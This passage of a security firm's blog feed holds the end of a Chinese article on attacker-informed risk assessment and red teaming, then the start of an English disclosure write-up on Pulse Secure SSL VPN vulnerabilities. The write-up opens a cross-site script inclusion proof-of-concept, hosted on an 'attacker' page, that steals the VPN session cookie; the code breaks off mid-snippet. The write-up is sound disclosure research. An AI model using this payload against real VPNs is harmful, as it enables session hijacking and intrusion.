      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;用戶個資&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;勒贖軟體加密&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;轉帳系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;軟體失效&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;遭到 DDoS 攻擊&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;核心系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;軟體失效&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;維護服務時間過長&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;版本更新系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;未經授權存取&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;橫向移動&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;內部差勤系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;系統入侵&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;然而，對敵人而言，選擇欲攻下的灘頭堡時，看重的是&lt;strong&gt;資產的戰略價值&lt;/strong&gt;，而與資產本身的價值沒有必然的關係，如上表項次 6 的內部差勤系統如果是能串接到敵人主要的標的，對他來說就是一個必定會設法取得控制權的資產，而這時可以發現經由簡化版的風險評鑑並不容易呈現這個資產所面臨的風險。&lt;/p&gt;

&lt;h3 id=&quot;低估弱點可利用機率&quot;&gt;低估弱點可利用機率&lt;/h3&gt;
&lt;p&gt;防守方在使用分險評鑑時，另一個問題是無法準確的估計弱點的可利用機率，雖然市面上已經有許多弱點管理軟體可以協助，但面對真實攻擊時，敵人不會只利用已知的漏洞或是 OWASP TOP10，甚至自行研發 0-day。因此，當企業已經進行一定程度的防護措施後，如果不曾經歷資安事故或缺乏正確的認知，往往認為應該不會有這麼厲害的駭客可以突破既有的防護措施，但從歷來的資安事故及我們服務的經驗告訴我們，其實電影裡面演的都是真的！！&lt;/p&gt;

&lt;h2 id=&quot;從攻擊者的角度改善風險評鑑&quot;&gt;從攻擊者的角度改善風險評鑑&lt;/h2&gt;
&lt;p&gt;很多人以為攻擊者的角度指的是漏洞挖掘，其實並不全然。攻擊者對於想竊取的資產，也是經過縝密的規劃及反～覆～觀～察～，他們一樣有策略、技法跟工具。而 &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; 就是一個對於已知攻擊策略及技巧具備完整定義及收集的框架，它可以用來協助建立威脅情資 (Threat Intelligence)、改善防守方的偵測及分析、強化模擬敵人及紅隊演練等，相關的使用方式都在其官網上可以找到，細節我們不在這邊介紹。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以將已經發生的資安事故 (Incident) 或紅隊演練對應到 ATT&amp;amp;CK Enterprise Framework 中，並且評估目前所建置的控制措施是否可以減緩、阻擋或偵測這些技巧。以下圖為例，淺綠色方塊是紅隊演練所採用的技巧、紅色方塊則是資安事故使用的技巧，企業可以同時比對多個資安事故或是紅隊演練的結果，找出交集的淺黃色區塊，即是企業可以優先強化的控制措施或是預算應該投入之處。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊有個需要特別注意的地方，ATT&amp;amp;CK Enterprise Framework 作為一個驗證防守方控制措施的有效性是一個非常好的框架，然而不建議利用這個框架的特定技巧作為限制紅隊演練的情境，要記得「當使用 ATT&amp;amp;CK 時要注意有其偏差，這可能會將已知的攻擊行為優先於未知的攻擊行為」，正如同紅隊演練的精神，是透過無所不用其極的方式找到可以成功的入侵方式，因此我們會建議給予紅隊演練團隊最自由的發揮空間，才能真正找出企業可能的盲點。&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Remember any ATT&amp;amp;CK-mapped data has biases:You’re prioritizing known adversary behavior over the unknown.
－ Katie Nickels, Threat Intelligence Lead @ The MITRE Corporation&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;挑選適合的方法改善防禦策略&quot;&gt;挑選適合的方法改善防禦策略&lt;/h2&gt;
&lt;p&gt;那麼在我們了解敵人會使用的策略、技巧之後，企業要如何挑選改善防禦策略的方法？理想上，我們建議如果預算許可，&lt;a href=&quot;https://devco.re/services/red-team#service-content-3&quot;&gt;這類型&lt;/a&gt;的企業至少應該執行一次高強度的紅隊演練，來全面性的盤點企業面臨的威脅，但現實上並非每個企業都有足夠的預算。因此，在不同的條件下，可以使用不同的方法來改善防禦策略，我們建議可以從以下幾個因素進行評估：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;時間：執行這個方法所需要的時間。&lt;/li&gt;
  &lt;li&gt;成本：利用這個方法需要付出的成本 (包含金錢、名聲)。&lt;/li&gt;
  &lt;li&gt;真實性：所採用的方法是否能真實反映現實的威脅。&lt;/li&gt;
  &lt;li&gt;範圍：所採用的方法能涵蓋範圍是否足以代表企業整體狀況。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這邊我們以風險評鑑、弱點掃描、滲透測試、模擬攻擊、紅隊演練及資安事件作為改善防禦策略的方法，而分別就上述六個項目給予相對的分數，並且依照&lt;strong&gt;真實性、範圍、成本及時間作為排序的優先序&lt;/strong&gt;(順序依企業的狀況有所不同）。而我們會這樣排序的原因是：一個好的方法應該要&lt;strong&gt;與真實世界的攻擊相仿&lt;/strong&gt;而且在整個過程上&lt;strong&gt;足以發現企業整體資安的狀況&lt;/strong&gt;，最後才是考慮所花費的成本及時間。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;方法&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;真實性&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;範圍&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;成本&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;時間&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;資安事件&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;紅隊演練&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;模擬攻擊&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;滲透測試&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;弱點掃描&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;風險評鑑&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;到這裡，除了資安事件外，大致可以決定要用來協助評估防禦策略所應該選擇的方法。更重要的是在使用這些方法後，要將結果反饋回風險評鑑中，因為相較於其他方法風險評鑑是一個最簡單且廣泛的方法，這有助於企業持續將資源投注在重大的風險上。&lt;/p&gt;

&lt;h2 id=&quot;案例&quot;&gt;案例&lt;/h2&gt;
&lt;p&gt;最後，我們以一個紅隊演練案例中所發現控制措施的疏漏，來改善企業的風險評鑑方式。同時，我們將入侵的成果對應至 ISO27001:2013 的本文要求及控制項目，這些項目可以視為以攻擊者的角度稽核企業的管理制度，更能反映制度的落實情形。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項目&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;發現&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;本文/附錄&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;核心系統盤點未完整&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;本文 4.3 決定 ISMS 範圍&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;監控範圍不足&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;本文 4.2 關注方之需要與期望&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;不同系統使用相同帳號密碼&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.3 通行碼管理系統&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;管理帳號存在密碼規則&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.3 通行碼管理系統&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AD 重大漏洞未修補&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.12.6.1 技術脆弱性管理&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;未限制來源 IP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.1 系統存取限制&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;次要網站防護不足&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.14.1.1 資訊安全要求事項分析及規格&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;VPN 網段存取內部系統&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.13.1.3 網路區隔&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;另外，從演練的結果可以發現下表項次 1 及項次 2 的機率都被證實會發生且位於入侵核心資產的路徑上，因此衝擊及機率均應該由原本的 2 提升為 3，這導致項次 1 的風險值超過了企業原本設定的可接受風險 (27)；另外，儘管在演練結果中清楚的知道項次 2 的內部差勤系統是必然可以成功入侵且間接控制核心資產的系統，其風險值仍遠低於企業會進行處理的風險，這正是我們前面所提到低估戰略價值的問題，因此我們會建議，&lt;strong&gt;在紅隊演練路徑上可以獲得核心資產的風險項目，都應該視為不可接受風險來進行處理&lt;/strong&gt;。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項次&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;資產名稱&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;價值&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;威脅&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;弱點&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;衝擊&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;機率&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;風險&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;版本更新系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;未經授權存取&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;橫向移動&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;內部差勤系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;系統入侵&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;最後，引用 &lt;a href=&quot;/blog/author/shaolin/&quot;&gt;Shaolin&lt;/a&gt; 在研討會上的結語&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;紅隊演練的精髓不是在告訴你有多脆弱，在於真正壞人闖入時你可以獨當一面擋下。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;希望各位都能找到可以持續改善防禦策略的方法，讓企業的環境更加安全。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/09/def-strategy/</link>
                <guid>https://devco.re/blog/2019/10/09/def-strategy</guid>
                <pubDate>Wed, 09 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;

&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;

&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldn’t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it’s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;

&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;

&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven’t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;

&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;

&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it’s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research day…&lt;/p&gt;

&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! It’s a stack-based overflow on the management interface! Although this bug isn’t that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;

&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;It’s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;

&lt;p&gt;The script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;

&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
